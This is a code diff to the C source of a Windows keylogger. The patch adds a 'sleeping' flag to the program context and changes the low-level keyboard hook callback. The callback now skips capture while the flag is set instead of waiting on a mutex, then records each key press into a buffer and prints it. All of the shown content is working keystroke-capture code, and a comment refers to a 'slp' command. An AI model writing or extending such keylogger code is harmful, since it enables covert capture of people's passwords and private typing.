@@ -65,6 +65,7 @@ PROGRAM_CONTEXT* initProgramContext() {
     prCon->hWriteThread = NULL;
     prCon->hMutexThreadSync = NULL;
     prCon->shutdown = FALSE;
+    prCon->sleeping = FALSE;
     return prCon;
 }
 
@@ -189,13 +190,13 @@ ERR_CODE runKeyLogger() {
 }
 
 /**
- * Call back function evoked on every key press, as set by the 
- * SetWindowsHookExA function
+ * Call back function evoked on every key press, as set by the SetWindowsHookExA 
+ * function. Creating this function was also based on the previous functions resource
  */
 LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    // by waiting for the mutex we can ensure keys are not captured during slp command
-    WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);
-
+    if (progContext->sleeping) {  // skip the program is "sleeping"
+        return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
+    }
     KBDLLHOOKSTRUCT *keyPress = (KBDLLHOOKSTRUCT *)lParam;
     DWORD vkCode = keyPress->vkCode;
 
@@ -204,7 +205,6 @@ LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     // then skip all state update keys and non key down events
     BOOL wasUpdated = updateKeyLoggerState(progContext->kLogger, wParam, &vkCode);
     if (wasUpdated || wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
-        ReleaseMutex(progContext->hMutexThreadSync);
         return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
     }
     
@@ -213,8 +213,6 @@ LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         // do something?
     }
     printf("%s\n", progContext->kLogger->keyBuffer);
-
-    ReleaseMutex(progContext->hMutexThreadSync);
     return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
 }
 
